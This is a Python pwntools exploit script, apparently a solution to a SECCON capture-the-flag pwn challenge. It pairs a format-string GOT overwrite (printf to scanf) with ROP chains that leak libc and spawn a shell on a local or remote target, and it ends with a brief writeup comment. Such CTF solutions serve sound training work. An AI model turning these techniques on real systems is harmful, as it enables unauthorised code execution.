#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./chall_patched")
    if args.GDB:
        gdb.attach(r,'b *0x40120d\nb *0x401196\nc')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

scanf_got = 0x404030
printf_got = 0x404028
scanf_plt = 0x4010a0
sl(b"%"+str(scanf_plt).encode()+b"c%8$llna"+p64(printf_got)[:-2])
ru("a")
pop_rdi = 0x0000000000401283
ret = pop_rdi+1
sl(b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted "+cyclic(40)+p64(pop_rdi)+p64(0x404018)+p64(0x401070)+p64(0x0000000000401196))
sl("warmly. abc")
libc = l64() - 0x87bd0
leak("libc",hex(libc))

sla(b'asked.\n',b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted "+cyclic(40)+p64(pop_rdi)+p64(libc+0x1cb42f)+p64(ret)+p64(libc+0x0000000000058740))
sl("bbb")
r.interactive()

'''
Writeup:
GOT Hijacking printf to scanf, the rest is "weird" scanf("... %s ...",buf)
Notice that we cannot have 0x20 in payload (space, I stucked here for a while)
'''

